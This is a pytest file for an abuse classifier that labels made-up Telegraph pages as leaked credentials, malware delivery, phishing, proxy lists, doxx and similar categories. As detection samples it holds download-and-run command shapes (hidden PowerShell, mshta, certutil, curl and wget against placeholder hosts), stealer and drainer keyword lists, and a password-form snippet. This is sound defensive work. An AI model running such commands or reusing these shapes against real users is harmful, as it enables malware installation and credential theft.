"""Tests for the category rules (plan/classification-plan-2026-11-15.md).

For each category: pages in the shape the survey counted get the label, and
the nearest wrong shape does not. Every page here is made up in that shape.
None holds a real account, address, key or person, and nothing here reads a
held-out page from known.txt.

The weights and word lists are first guesses that the labelled sample will
change. What is pinned is what each rule is for: the shapes its exists_for
line names, the nearest shape it must not take, and whether it decides alone.
"""

import base64

import pytest

from graphwatch.classify import body_hash, classify_page, computed_rules
from graphwatch.rules import (
    CATEGORIES,
    INTELLIGENCE,
    RULES,
    THRESHOLD,
    body_of,
    category_scores,
    is_archive_link,
    is_autologin_link,
    labels_for,
    primary_label,
    score,
)
from graphwatch.telegraph import page_text

API_SAMPLE = "Hello,+world!"
SPOOF_TITLE = "www.tenable.com@agfc.harper18.workers.dev/"
# What redaction leaves where a secret was: the marker and 64 hex digits
SECRET = "SECRET{" + "a1b2c3d4" * 8 + "}"
OTHER_SECRET = "SECRET{" + "0f9e8d7c" * 8 + "}"
FILLER = "nothing of interest in this sentence at all. "
COMBO_LINES = [f"user{n}@mail.example.com:{SECRET}" for n in range(12)]
PASSWORD_LINES = [f"panel{n} password: {SECRET}" for n in range(10)]
ONION_V3 = "a2b3c4d5e6f7g2h3" * 3 + "a2b3c4d5" + ".onion"
ETH_ADDRESS = "0x" + "a1" * 20


def classify(title: str, body: str, description: str = "", templated: bool = False):
    """The hits for one made-up page, computed rules included."""
    text = page_text({"title": title, "description": description, "content": [body]})
    stored_body = body_of(title, description, text)
    digest = body_hash(stored_body) if templated else None
    return classify_page(title, description, text, computed_rules(stored_body, digest))


def labels(title: str, body: str, description: str = "", templated: bool = False):
    return labels_for(category_scores(classify(title, body, description, templated)))


def fired(hits) -> set[str]:
    return {hit.rule.name for hit in hits}


def b64(s: str) -> str:
    return base64.b64encode(s.encode("utf-8")).decode("ascii")


# --------------------------------------------------------------------------
# the table
# --------------------------------------------------------------------------


def test_there_are_fourteen_categories_in_the_planned_order():
    assert CATEGORIES == (
        "resolver",
        "template_spam",
        "pointer",
        "leaked_credentials",
        "proxy_list",
        "malware_delivery",
        "fraud_market",
        "crypto_lure",
        "phishing",
        "doxx",
        "telegram_funnel",
        "seo_spam",
        "placeholder",
        "prose",
    )


def test_nine_categories_are_intelligence_and_five_are_noise():
    assert INTELLIGENCE <= set(CATEGORIES)
    assert set(CATEGORIES) - INTELLIGENCE == {
        "template_spam",
        "telegram_funnel",
        "seo_spam",
        "placeholder",
        "prose",
    }


def test_every_category_can_reach_the_threshold():
    # A category whose positive weights sum below 4 could never be a label.
    for category in CATEGORIES:
        best = sum(r.weight for r in RULES if r.category == category and r.weight > 0)
        assert best >= THRESHOLD, category


# --------------------------------------------------------------------------
# one rule at a time: what a weak rule scores alone, the shapes a rule takes
# and the nearest shape it leaves
# --------------------------------------------------------------------------

@pytest.mark.parametrize(
    "rule, category, body, weight",
    [
        ("ip_in_short_body", "pointer", "the resolver at 8.8.8.8 is run by Google", 3),
        ("tunnel_host", "pointer", "the panel moved to abc123.trycloudflare.com today", 3),
        ("encoded_body", "pointer", b64("just some ordinary words"), 3),
        ("raw_paste_link", "pointer", "config: https://pastebin.com/raw/Ab12Cd34", 2),
        ("some_secrets", "leaked_credentials", "\n".join(PASSWORD_LINES[:3]), 2),
        # Decided 22 November: a numeric id hashed as a card number looks the same.
        ("token_in_path", "leaked_credentials", f"write to me https://dating.example.com/l/{SECRET}/open", 2),
        ("proxy_config_keys", "proxy_list", '{"server": "vpn.example.org", "port": 443, "method": "aes-256-gcm"}', 2),
        ("single_ip_port", "proxy_list", "Test configuration: 149.154.167.40:443 DC 2", 1),
        ("run_command", "malware_delivery", "open a terminal and run PowerShell -w hidden ./fix.dat", 3),
        ("archive_link", "malware_delivery", "https://files.example.com/book.zip", 2),
        ("file_host_link", "malware_delivery", "the book is at https://mega.nz/file/abc", 1),
        ("onion_address", "fraud_market", f"mirror: http://{ONION_V3}/", 3),
        ("card_terms", "fraud_market", "selling CVV, fresh every day", 3),
        ("stealer_terms", "fraud_market", "a new Stealer was found in the wild", 2),
        ("drainer_terms", "crypto_lure", "Airdrop next week, do not miss it", 3),
        ("wallet_address", "crypto_lure", f"donations: {ETH_ADDRESS}", 2),
        ("free_host_link", "phishing", "verify at https://login-check.pages.dev", 2),
        ("shortener_link", "phishing", "details: https://bit.ly/3abcde", 1),
        # doxx: counted, never excerpted, so these pages are field names and zeros
        ("identity_passport", "doxx", "Паспорт: 0000 000000", 2),
        ("identity_registration", "doxx", "Прописка: город, улица, дом 0", 2),
        ("identity_birth_date", "doxx", "Дата рождения: 00.00.0000", 2),
        ("identity_address", "doxx", "Адрес проживания: город, улица, дом 0", 2),
        ("telegram_invite", "telegram_funnel", "join https://t.me/+AbCdEfGhIjKlMnOp", 2),
        ("telegram_bot_link", "telegram_funnel", "write https://t.me/SomeShopBot", 2),
        ("telegram_handle", "telegram_funnel", "write to @some_handle", 1),
        ("adult_ad_terms", "telegram_funnel", "Слив каждый день", 1),
        ("casino_terms", "seo_spam", "Казино онлайн: бонус каждый день", 3),
    ],
)
def test_a_rule_that_needs_company_scores_its_weight_alone(rule, category, body, weight):
    # The category is written out here: which label a weak rule counts
    # towards is a decision, and reading it from the table would pin nothing.
    hits = classify("note", body)
    assert rule in fired(hits)
    assert category_scores(hits)[category] == weight


@pytest.mark.parametrize(
    "rule, shape",
    [
        ("tunnel_host", "gate.example.workers.dev"),
        ("tunnel_host", "1a2b-3c4d.ngrok-free.app"),
        ("tunnel_host", "myhome.duckdns.org"),
        ("raw_paste_link", "https://raw.githubusercontent.com/user/repo/main/hosts.txt"),
        ("run_command", "mshta https://files.example.com/a"),
        ("run_command", "certutil -urlcache -f https://files.example.com/a"),
        ("run_command", "curl -s https://files.example.com/a"),
        ("run_command", "wget https://files.example.com/a"),
        ("file_host_link", "https://www.mediafire.com/file/abc123/book"),
        ("file_host_link", "https://github.com/user/tool/releases/download/v1/tool"),
        ("onion_address", "a2b3c4d5e6f7g2h3.onion"),
        ("card_terms", "fullz"),
        ("stealer_terms", "lumma"),
        ("stealer_terms", "vidar"),
        ("drainer_terms", "seed phrase"),
        ("drainer_terms", "WalletConnect"),
        ("drainer_terms", "drainer"),
        ("wallet_address", "T" + "Zz9" * 11),
        ("wallet_address", "bc1q" + "x0" * 19),
        ("free_host_link", "login-check.web.app"),
        ("free_host_link", "login-check.netlify.app"),
        ("free_host_link", "login-check.github.io"),
        ("telegram_invite", "https://t.me/joinchat/AbCdEfGhIjKlMnOp"),
        ("telegram_handle", "@abcde"),  # five characters, the shortest Telegram allows
    ],
)
def test_a_rule_takes_each_shape_its_reason_names(rule, shape):
    # The shapes a rule's exists_for line, its pattern comment or the plan's
    # rule table names. The table above holds the first of each.
    assert rule in fired(classify("note", f"look: {shape} today"))


@pytest.mark.parametrize(
    "rule, body",
    [
        ("tracking_url_body", "https://shop.example.com/item?id=12345"),
        # words after the URL, so the body is not one URL (found by the review)
        ("tracking_url_body", "https://example.com/r?d=" + "a1b2c3d4" * 4 + "\nsee you there"),
        ("tunnel_host", "get a tunnel at https://ngrok.io/download"),
        ("raw_paste_link", "the paste: https://pastebin.com/Ab12Cd34"),
        ("telegram_api_pair", "api_id: 1234567"),
        # the hash is 450 characters after the id, and the pair is within 200
        ("telegram_api_pair", f"api_id: 1234567\n{FILLER * 10}\napi_hash: {SECRET}"),
        # the token is in the query, not in the path
        ("token_in_path", f"https://shop.example.com/item?ref=/{SECRET}"),
        # the token is the credentials before the host (found by the review)
        ("token_in_path", f"http://{SECRET}@8.8.8.8:8080/list"),
        # the ss:// inside wss:// is not a proxy scheme
        ("proxy_uri", "connect to wss://example.com/ws"),
        # server= has to be in the link's own query (the first found by the review)
        ("telegram_proxy_link", "server= is missing here: https://t.me/proxy?port=443"),
        ("telegram_proxy_link", "https://t.me/proxy?port=443 has no server=8.8.8.8 in it"),
        ("run_command", "I use curl and wget every day"),
        ("onion_address", "mirror: http://abcd" + ONION_V3),  # 60 characters, not 16 or 56
        ("card_terms", "the xcvv model and the cvvz model"),
        ("wallet_address", "sent, see transaction 0x" + "a1" * 32),  # 64 hex digits, not 40
        ("free_host_link", "host the site on https://pages.dev for free"),
        # A comment in rules.py names this one: habit.ly/ is not bit.ly/
        ("shortener_link", "read https://habit.ly/tips"),
        ("telegram_invite", "our channel: https://t.me/somenews"),
        ("telegram_bot_link", "our channel: https://t.me/robotics_news"),
        ("telegram_handle", "write to @abcd"),  # one character short
        ("telegram_handle", "mail me at someone@example.com"),
    ],
)
def test_a_rule_leaves_the_nearest_shape_that_is_not_its_own(rule, body):
    assert rule not in fired(classify("note", body))


@pytest.mark.parametrize(
    "category, body",
    [
        ("malware_delivery", "powershell -w hidden iwr https://mega.nz/file/abc -o a.dat"),
        ("fraud_market", "carding guide, redline logs for sale"),
        ("crypto_lure", f"claim the airdrop, send gas to {ETH_ADDRESS}"),
        ("doxx", "Паспорт: 0000 000000\nДата рождения: 00.00.0000"),
        ("telegram_funnel", "слив в канале https://t.me/+AbCdEfGhIjKlMnOp пиши @some_handle"),
    ],
)
def test_weak_rules_of_one_category_together_make_the_label(category, body):
    assert category in labels("note", body)


def test_the_same_identity_field_twice_is_still_one_field():
    scores = category_scores(classify("x", "паспорт старый, паспорт новый"))
    assert scores["doxx"] == 2


def test_a_doxx_hit_keeps_the_name_of_the_field_and_nothing_of_the_person():
    # Counted, never excerpted: the evidence is stored and printed by --explain.
    # The registration pattern is the stem, so its evidence stops before the ending.
    body = (
        "Паспорт: 0000 000000\nПрописка: город, улица, дом 0\n"
        "Дата рождения: 00.00.0000\nАдрес проживания: город, улица, дом 0"
    )
    evidence = {h.rule.name: h.evidence for h in classify("x", body) if h.rule.category == "doxx"}
    assert evidence == {
        "identity_passport": "Паспорт",
        "identity_registration": "Прописк",
        "identity_birth_date": "Дата рождения",
        "identity_address": "Адрес проживания",
    }


# --------------------------------------------------------------------------
# resolver: unchanged, and first in the order
# --------------------------------------------------------------------------


def test_the_spoof_page_is_a_resolver_first():
    found = labels(SPOOF_TITLE, API_SAMPLE, API_SAMPLE)
    assert found[0] == "resolver"
    assert primary_label(found) == "resolver"


def test_a_combo_dump_is_not_a_resolver():
    hits = classify("Accounts", "\n".join(COMBO_LINES[:5]))
    assert score(hits) < THRESHOLD
    assert "resolver" not in labels_for(category_scores(hits))


# --------------------------------------------------------------------------
# template_spam
# --------------------------------------------------------------------------

SQUATTER_BODY = (
    "https://t.me/+YztOEovieQIzZjY8 exploits, malware, RATs, steallers and other "
    "stuff https://t.me/+YztOEovieQIzZjY8 https://t.me/+YztOEovieQIzZjY8"
)


def test_a_templated_advert_is_template_spam_whatever_words_it_uses():
    found = labels("Cobalt-Strike", SQUATTER_BODY, templated=True)
    assert primary_label(found) == "template_spam"


def test_the_same_advert_under_one_title_is_not_template_spam():
    assert "template_spam" not in labels("Cobalt-Strike", SQUATTER_BODY)


# --------------------------------------------------------------------------
# pointer
# --------------------------------------------------------------------------

HOST_OF_79 = "a" * 33 + "." + "b" * 33 + ".example.com"


@pytest.mark.parametrize(
    "body",
    [
        "8.8.8.8",
        "updates.example-cdn.com:8443",
        "https://updates.example-cdn.com",
        "http://updates.example-cdn.com:8080/",
        HOST_OF_79,
    ],
)
def test_a_body_that_is_one_address_is_a_pointer(body):
    hits = classify("note", body)
    assert "bare_pointer_body" in fired(hits)
    assert "pointer" in labels_for(category_scores(hits))


@pytest.mark.parametrize(
    "body",
    [
        # Decided 22 November: a pointer is a server address, not a link to share.
        "https://t.me/somenews",
        "https://updates.example-cdn.com/#top",
        "https://updates.example-cdn.com?v=2",
        "the resolver at 8.8.8.8 is run by Google",
        "8.8.8.8 is the resolver I use",
        "192.168.1.64",
        "a" + HOST_OF_79,
    ],
)
def test_a_body_that_is_not_one_short_public_address_is_not_a_pointer(body):
    hits = classify("note", body)
    assert "bare_pointer_body" not in fired(hits)
    assert "pointer" not in labels_for(category_scores(hits))


@pytest.mark.parametrize(
    "body, counted",
    [
        ("the gate:\n8.8.8.8", True),  # two lines are still one short body
        (FILLER * 6 + "8.8.8.8", False),
        ("the router is at 192.168.1.64", False),
    ],
)
def test_an_ip_counts_only_when_it_is_public_and_the_body_is_short(body, counted):
    assert ("ip_in_short_body" in fired(classify("note", body))) is counted


def test_a_body_of_199_characters_is_short_and_one_of_200_is_not():
    assert "ip_in_short_body" in fired(classify("note", "8.8.8.8 " + "x" * 191))
    assert "ip_in_short_body" not in fired(classify("note", "8.8.8.8 " + "x" * 192))


@pytest.mark.parametrize(
    "body, counted",
    [
        (b64("8.8.8.8"), True),  # twelve characters with its padding
        ("382e382e382e38", True),  # the same address in hex
        ("HAXDQLRYFY4A", True),  # and in base32
        ("Congratulations", False),
        (b64("just some ordinary words") + " and a line after it", False),
    ],
)
def test_an_encoded_body_is_one_whole_token_that_decodes_to_text(body, counted):
    assert ("encoded_body" in fired(classify("note", body))) is counted


def test_an_encoded_address_posted_through_the_api_is_a_pointer():
    body = b64("https://updates.example-cdn.com/gate")  # encoded, a path does not matter
    hits = classify("note", body, API_SAMPLE)
    assert {"encoded_body", "api_sample_page"} <= fired(hits)
    assert "pointer" in labels_for(category_scores(hits))


def test_a_dating_autologin_url_is_not_a_pointer():
    body = f"https://m.dating.example.com/autologin/?key={SECRET}&loc=en"
    hits = classify("Katya", body)
    assert category_scores(hits)["pointer"] == -3
    assert labels_for(category_scores(hits)) == ["leaked_credentials"]


def test_a_long_tracking_url_takes_the_penalty():
    body = "https://click.example.com/r?campaign=" + "a1b2c3d4" * 4
    hits = classify("note", body)
    assert "tracking_url_body" in fired(hits)
    assert category_scores(hits)["pointer"] < 0


# --------------------------------------------------------------------------
# leaked_credentials
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "rule, body",
    [
        ("combo_lines", "\n".join(COMBO_LINES[:3])),
        ("many_secrets", "\n".join(PASSWORD_LINES)),
        ("telegram_session", f'WARNING_BANNER\n"dc2_auth_key": "{SECRET}",\n"user_auth": 1'),
        ("telegram_api_pair", f"api_id: 1234567\napi_hash: {SECRET}"),
        ("telegram_api_pair", f"api_hash = {SECRET}\napi_id = 1234567"),
        ("autologin_link", f"write to me https://dating.example.com/in?u=7&token={SECRET}"),
        # Found by the review: the rule has to read a URL to the end of its fragment.
        ("autologin_link", f"https://d.example.com/#access_token={SECRET}"),
    ],
)
def test_each_shape_of_leaked_accounts_is_leaked_credentials(rule, body):
    hits = classify("Accounts", body)
    assert rule in fired(hits)
    assert primary_label(labels_for(category_scores(hits))) == "leaked_credentials"


@pytest.mark.parametrize(
    "rule, body",
    [
        ("combo_lines", "\n".join(COMBO_LINES[:2])),
        ("some_secrets", "\n".join(PASSWORD_LINES[:2])),
        ("many_secrets", "\n".join(PASSWORD_LINES[:9])),
        ("ip_port_list", "8.8.8.8:1080\n1.1.1.1:3128"),
        ("proxy_config_keys", '{"port": 443}'),
    ],
)
def test_a_rule_that_counts_needs_its_whole_count_in_the_body(rule, body):
    # The description repeats the first lines of the body. A rule that read
    # the text and not the body would count each of them twice.
    assert rule not in fired(classify("Accounts", body, description=body))


def test_secrets_behind_a_bare_word_and_colon_are_not_counted():
    # The movie-link shape: redaction hashed the value of Size:400MB.
    body = "\n".join(f"Size:{SECRET} Quality:{OTHER_SECRET}" for _ in range(8))
    hits = classify("Movie 2026", body)
    assert not {"many_secrets", "some_secrets"} & fired(hits)


def test_secrets_behind_a_password_label_and_colon_are_counted():
    body = "\n".join(f"panel{n} Password:{SECRET} db_pass:{OTHER_SECRET}" for n in range(5))
    assert "many_secrets" in fired(classify("logins", body))


def test_email_password_lines_are_left_to_combo_lines():
    hits = classify("Accounts", "\n".join(COMBO_LINES))
    assert "combo_lines" in fired(hits)
    assert "many_secrets" not in fired(hits)


@pytest.mark.parametrize(
    "url, logs_in",
    [
        (f"https://m.dating.example.com/autologin/?key={SECRET}", True),
        ("https://dating.example.com/Token-Login/7", True),
        # The names redact.py hashes a value behind, in a query or a fragment
        (f"https://d.example.com/in?token={SECRET}", True),
        (f"https://d.example.com/in?u=7&auth={SECRET}", True),
        (f"https://d.example.com/#access_token={SECRET}", True),
        (f"https://d.example.com/in?login_token={SECRET}", True),
        (f"https://d.example.com/in?session={SECRET}", True),
        (f"https://d.example.com/in?sid={SECRET}", True),
        (f"https://d.example.com/in?code={SECRET}", True),
        # Hashed for another reason, a card number say, and not a login parameter
        (f"https://shop.example.com/item?barcode={SECRET}", False),
        ("https://d.example.com/in?token=see-the-docs", False),
    ],
)
def test_an_autologin_link_has_the_word_or_a_hashed_login_parameter(url, logs_in):
    assert is_autologin_link(url) is logs_in


# --------------------------------------------------------------------------
# proxy_list
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "body",
    [
        f"vless://{SECRET}@vpn.example.org:443?security=tls#home",
        f"vmess://{SECRET}@vpn.example.org:443",
        f"ss://{SECRET}@vpn.example.org:8388",
        f"trojan://{SECRET}@vpn.example.org:443",
        "socks5://8.8.8.8:1080",
        "8.8.8.8:1080\n1.1.1.1:3128\n9.9.9.9:8080",
        f"https://t.me/proxy?server=8.8.8.8&port=443&secret={SECRET}",
        f"tg://proxy?server=p.example.org&port=443&secret={SECRET}",
        "https://t.me/socks?server=p.example.org&port=1080",
    ],
)
def test_proxy_endpoints_are_a_proxy_list(body):
    assert "proxy_list" in labels("free proxy", "fresh today:\n" + body)


def test_private_ip_ports_are_not_a_proxy_list():
    body = "192.168.1.1:8080\n10.0.0.1:3128\n127.0.0.1:9050"
    hits = classify("notes", body)
    assert not {"ip_port_list", "single_ip_port"} & fired(hits)


@pytest.mark.parametrize(
    "link",
    [
        f"vless://{SECRET}@vpn.example.org:443?security=tls",
        f"https://t.me/proxy?server=p.example.org&port=443&secret={SECRET}",
    ],
)
def test_a_long_proxy_list_is_not_leaked_credentials(link):
    # Each link's user id or secret is hashed, but it is a proxy and not an account.
    found = labels("free vpn", "\n".join(f"{link}#{n}" for n in range(12)))
    assert primary_label(found) == "proxy_list"
    assert "leaked_credentials" not in found


# --------------------------------------------------------------------------
# malware_delivery
# --------------------------------------------------------------------------


@pytest.mark.parametrize("extension", ["exe", "apk", "msi", "scr", "ps1", "lnk", "hta", "iso"])
def test_a_link_to_an_executable_is_malware_delivery(extension):
    body = f"download https://files.example.com/setup.{extension} and run it"
    assert "malware_delivery" in labels("Update", body)


@pytest.mark.parametrize("extension", ["zip", "rar", "7z"])
def test_a_link_to_an_archive_is_an_archive_link(extension):
    assert is_archive_link(f"https://files.example.com/book.{extension}") is True


@pytest.mark.parametrize(
    "link",
    [
        "http://files.example.com/setup.exe",
        "https://files.example.com/setup.EXE?dl=1",
        "https://files.example.com/a/b/tool.msi#frag",
        "(https://files.example.com/setup.exe).",
        "https://files.example.com/setup.exe, then run it",
        '<a href="https://files.example.com/setup.exe">here</a>',
        "<https://files.example.com/setup.exe>",
    ],
)
def test_a_url_whose_path_ends_in_the_extension_is_a_file_link(link):
    assert "executable_link" in fired(classify("Update", f"get {link}"))


def test_two_file_links_are_two_matches():
    body = "https://a.example.com/x.exe and https://b.example.com/y.apk and https://c.example.com/page"
    hit = next(h for h in classify("Update", body) if h.rule.name == "executable_link")
    assert (hit.evidence, hit.matches) == ("https://a.example.com/x.exe", 2)


@pytest.mark.parametrize(
    "body",
    [
        "new laptop review https://www.msi.com/Laptop/Example-15 is out",
        "docs https://docs.example.com/a.zip.html and https://my.rar.example.org/",
        "https://example.com/setup.exe/readme",
        "http://[broken/setup.exe",
    ],
)
def test_an_extension_in_the_hostname_or_mid_path_is_not_a_file_link(body):
    hits = classify("review", body)
    assert not {"executable_link", "archive_link"} & fired(hits)
    assert "malware_delivery" not in labels_for(category_scores(hits))


def test_the_rules_about_links_read_the_targets_behind_the_link_text():
    # Decided 22 November: the address behind "Download here" is not in the text.
    links = [
        "https://abc123.trycloudflare.com/gate",
        "https://pastebin.com/raw/Ab12Cd34",
        f"https://dating.example.com/in?token={SECRET}",
        f"https://dating.example.com/l/{SECRET}/open",
        f"vless://{SECRET}@vpn.example.org:443",
        "tg://proxy?server=p.example.org&port=443",
        "https://files.example.com/setup.exe",
        "https://files.example.com/book.zip",
        "https://mega.nz/file/abc",
        f"http://{ONION_V3}/",
        "https://login-check.pages.dev/",
        "https://bit.ly/3abcde",
        "https://t.me/+AbCdEfGhIjKlMnOp",
        "https://t.me/some_shop_bot",
        "https://teraboxapp.com/s/1abc",
    ]
    text = page_text({"title": "note", "description": "", "content": ["Download here"]})
    assert fired(classify_page("note", "", text, links=links)) >= {
        "tunnel_host",
        "raw_paste_link",
        "autologin_link",
        "token_in_path",
        "proxy_uri",
        "telegram_proxy_link",
        "executable_link",
        "archive_link",
        "file_host_link",
        "onion_address",
        "free_host_link",
        "shortener_link",
        "telegram_invite",
        "telegram_bot_link",
        "movie_link_terms",
    }


# --------------------------------------------------------------------------
# phishing
# --------------------------------------------------------------------------


def test_the_source_of_a_login_form_is_phishing():
    body = '<form action="post.php"><input name="p" type="password"></form>'
    assert "phishing" in labels("PayPal", body)


@pytest.mark.parametrize(
    "tag, is_password",
    [
        ('<input name="p" type="password">', True),
        ("<input name='p' type='password'>", True),
        ("<input type=PASSWORD>", True),
        ('<input name="q" type="text">', False),
        ('<input name="password" type="text">', False),
    ],
)
def test_an_input_tag_counts_only_when_its_type_is_password(tag, is_password):
    assert ("login_form_source" in fired(classify("form", tag))) is is_password


def test_each_input_tag_of_a_form_is_read_on_its_own():
    # Found by the review: three tags on one line, two of them password fields.
    body = '<input name="user" type="text"><input name="p" type="password"><input type=PASSWORD>'
    hit = next(h for h in classify("form", body) if h.rule.name == "login_form_source")
    assert hit.matches == 2


# --------------------------------------------------------------------------
# seo_spam, placeholder and prose
# --------------------------------------------------------------------------


@pytest.mark.parametrize("host", ["mdisk.me/convertor/1x2", "teraboxapp.com/s/1abc"])
def test_a_movie_link_page_is_seo_spam(host):
    assert "seo_spam" in labels("Movie 2026", f"watch online https://{host}")


def test_an_api_test_page_is_a_placeholder_and_not_a_pointer():
    hits = classify("Hello", API_SAMPLE, API_SAMPLE)
    assert category_scores(hits)["pointer"] == 1
    assert labels_for(category_scores(hits)) == ["placeholder"]


def test_a_long_text_with_no_link_is_prose():
    assert labels("Story", FILLER * 80) == ["prose"]


# --------------------------------------------------------------------------
# primary label and pages with two labels
# --------------------------------------------------------------------------


def test_a_page_keeps_every_label_it_earns_and_the_first_in_category_order_is_primary():
    body = "\n".join(COMBO_LINES[:3]) + "\nwatch https://teraboxapp.com/s/1abc"
    found = labels("Accounts", body)
    assert found == ["leaked_credentials", "seo_spam"]
    assert primary_label(found) == "leaked_credentials"


def test_template_spam_outranks_every_category_but_resolver():
    found = labels("Accounts", "\n".join(COMBO_LINES[:3]), templated=True)
    assert {"template_spam", "leaked_credentials"} <= set(found)
    assert primary_label(found) == "template_spam"


def test_an_ordinary_page_has_no_label():
    found = labels("Meeting notes", "We met on Tuesday and agreed to meet again.")
    assert found == []
    assert primary_label(found) is None


# --------------------------------------------------------------------------
# no crafted page may take seconds (the review of 22 November)
# --------------------------------------------------------------------------

ADVERSARIAL_PAGES = {
    "tracking url then text": "https://example.com/r?d=" + "aB3-" * 15000 + "\nsee you there",
    "http:// repeated": "http://" * 9100,
    "https://a. repeated": "https://a." * 6400,
    "<input repeated": "<input" * 10600,
    "proxy link repeated": "server= " + "t.me/proxy?" * 5800,
    "t.me/ repeated": "t.me/" * 12800,
    "at signs": "@" * 64000,
    "scheme separators": "://" * 21000,
    "markers": "SECRET{" * 9100,
    "storage markers": "/!" * 32000,
    "api_hash repeated": "api_hash" * 8000,
    ".onion repeated": ".onion" * 10600,
    "quotes and colons": '":' * 32000,
    "one long line of words": "word " * 12800,
}


@pytest.mark.parametrize("name", sorted(ADVERSARIAL_PAGES))
def test_classifying_one_crafted_page_takes_well_under_a_second(name, laptop_seconds):
    # A page is up to 64 KB and whoever posts it chooses every character. The
    # first shape took 54 seconds at 4,000 characters before 22 November, and
    # the next four about ten seconds each at this size.
    body = ADVERSARIAL_PAGES[name]
    assert laptop_seconds(lambda: classify("Title", body, description=body[:300])) < 1.0, name
